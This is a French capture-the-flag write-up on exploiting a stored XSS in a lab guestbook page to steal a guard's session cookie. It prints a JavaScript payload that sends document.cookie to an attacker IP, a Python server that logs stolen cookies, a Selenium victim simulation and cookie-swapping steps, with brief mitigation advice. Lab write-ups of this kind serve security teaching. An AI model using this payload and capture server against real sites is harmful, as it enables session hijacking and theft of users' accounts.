---
title: Writes-up 2
prev: "/write-ups/wu1"
---

# 🏰 Stored XSS & Vol de Cookie - Livre d'Or de Lannisport

## 🎯 Objectif
John doit voler le **cookie de session d’un garde** pour accéder à Castral-Roc.
Pour cela, il injecte un **XSS stocké** dans le **livre d’or** afin de récupérer le cookie **non protégé par HttpOnly**.

**Flag attendu :** Le cookie de session du garde.

---

## ⚙️ Environnement
- **Cible :** lannisport.south
- **Page vulnérable :** livre_dor.php
- **Langage :** PHP / JavaScript

---

## 🚀 Étape 1 : Injecter un XSS dans le livre d’or
Le formulaire du livre d’or **ne filtre pas les entrées**, permettant d’injecter un script malveillant.

🔹 **Script XSS à injecter dans un commentaire** :
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://10.10.10.20:8000/?cookie=' + document.cookie, true);
xhr.send();
```

📌 **Effet** : Quand un garde consulte la page, son cookie de session est envoyé à l’attaquant.

---

## 🔍 Étape 2 : Capturer le cookie sur Kali
L’attaquant met en place un **serveur d’écoute** pour récupérer les cookies volés.

🔹 **Script Python sur Kali** :
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "cookie" in self.path:
            cookie = self.path.split("=")[1]
            print(f"Cookie volé : {cookie}")
            with open("stolen_cookies.txt", "a") as f:
                f.write(cookie + "\n")
        self.send_response(200)
        self.end_headers()

server_address = ('10.10.10.20', 8000)
httpd = HTTPServer(server_address, Handler)
print("[+] Serveur en écoute sur le port 8000...")
httpd.serve_forever()
```

📌 **Démarrer le serveur d’écoute sur Kali** :
```bash
python3 capture_server.py
```

---

## 🚀 Étape 3 : Déclencher l’attaque avec Selenium
Un **script Selenium** simule la navigation d’un garde qui consulte le livre d’or.

🔹 **Script Selenium (Victime - MacOS)** :
```python
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
driver.get("http://lannisport.south/login.php")

driver.find_element(By.NAME, "username").send_keys("garde")
driver.find_element(By.NAME, "password").send_keys("password")
driver.find_element(By.NAME, "submit").click()

time.sleep(3)
driver.get("http://lannisport.south/livre_dor.php")
time.sleep(10)

driver.quit()
```
📌 **Quand Selenium exécute ce script, il déclenche le XSS et envoie le cookie à Kali.**

---

## 🎯 Étape 4 : Validation du Flag
✅ **Kali reçoit le cookie de session** :
```bash
cat stolen_cookies.txt
```
✅ **Utilisation du cookie volé pour usurper la session du garde** :
- Ouvrir les outils développeur (F12) > **Application** > **Cookies**.
- Modifier PHPSESSID avec la valeur capturée.
- Recharger la page.

**🚀 Succès ! L’attaque est réalisée et le flag récupéré !** 🔥

---

## 🔒 Mitigation & Sécurisation
- **Activer HttpOnly sur les cookies** pour empêcher l’accès JavaScript.
- **Filtrer les entrées utilisateur** (htmlspecialchars()) pour empêcher le XSS.
- **Utiliser CSP (Content Security Policy)** pour bloquer les scripts inline.

---

## 🏆 Conclusion
- **Un XSS stocké a été exploité pour voler un cookie de session.**
- **Le serveur d’écoute Kali a capturé le flag.**
- **L’attaque est réussie !** 🚀🔥